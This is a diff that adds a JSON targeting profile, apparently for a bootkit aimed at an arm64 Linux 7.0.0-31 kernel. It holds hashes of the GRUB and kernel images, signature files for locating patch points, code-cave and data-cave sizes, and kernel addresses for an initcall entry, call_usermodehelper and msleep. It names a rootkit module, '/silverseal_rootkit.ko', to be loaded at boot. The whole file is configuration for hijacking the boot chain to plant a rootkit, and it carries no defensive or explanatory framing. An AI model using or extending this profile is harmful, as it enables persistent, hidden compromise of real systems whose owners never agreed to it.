@@ -1,0 +1,59 @@
+{
+  "schema_version": 1,
+  "kernel_release": "7.0.0-31-generic",
+  "profile_version": 3,
+  "kernel_virtual_base": "0xffff800080000000",
+  "artifacts": {
+    "grub": {
+      "file": "grubaa64.efi",
+      "sha256": "e9c439d22305d4962befc73ba0b2dbb6bef0cd7113399765ae9bc302bd3d269f"
+    },
+    "vmlinux": {
+      "file": "vmlinux-7.0.0-31-generic",
+      "sha256": "05a45d96d22e0a8e17562335131b742c414df6d2e498c1782bba418627a7e06e",
+      "length": "0x4540000"
+    },
+    "vmlinuz": {
+      "file": "vmlinuz-7.0.0-31-generic",
+      "sha256": "8e67dc8d70becb2305d66b132cbcb8f058691ef82513ba949a66a0f33002d3fa"
+    },
+    "system_map": {
+      "file": "System.map-7.0.0-31-generic",
+      "sha256": "6e3b4e3dd66ba10c2406fcee1ec1b2fc92db82c616504728debb63528afda296"
+    }
+  },
+  "signatures": {
+    "grub": {
+      "file": "grub-linux-boot-image.hex",
+      "profile_offset": 0
+    },
+    "zboot": {
+      "file": "zboot-decompress.hex"
+    },
+    "initcall": {
+      "file": "kernel-initcall-table.hex",
+      "profile_offset": 24
+    },
+    "code_cave": {
+      "file": "kernel-code-cave-context.hex",
+      "profile_offset": 32,
+      "capacity": 256
+    },
+    "schedule_work": {
+      "file": "kernel-schedule-work.hex"
+    }
+  },
+  "data_cave": {
+    "capacity": 2040
+  },
+  "virtual_addresses": {
+    "initcall_entry": "0xffff8000831ce498",
+    "code_cave": "0xffff800080010b84",
+    "data_cave": "0xffff8000843e6808",
+    "schedule_work": "0xffff80008003d578",
+    "msleep": "0xffff8000802981b0",
+    "call_usermodehelper": "0xffff80008015e2f0",
+    "original_initcall": "0xffff800082fa0758"
+  },
+  "module_path": "/silverseal_rootkit.ko"
+}
